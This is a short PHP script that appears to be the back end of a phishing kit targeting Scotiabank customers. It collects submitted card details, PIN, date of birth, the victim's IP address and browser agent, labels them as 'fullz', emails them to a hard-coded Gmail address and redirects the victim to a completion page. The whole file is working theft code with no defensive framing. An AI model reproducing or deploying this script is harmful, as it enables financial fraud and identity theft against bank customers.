<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$exp = $_POST['dl'];
$mmn = $_POST['mmn'];
$dob = $_POST['dob'];
date_default_timezone_set('UTC'); 
$timedate = date("D/M/Y g:i A");
$data ="
=============##SCOTIA FULLZ##===================
CVV : $cvv
EXP : $exp
PIN : $mmn
DOB : $dob
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr2 = 'medahnabil@gmail.com';

mail($emailusr2, $subj, $data);	

header("Location: complete.php");

?>
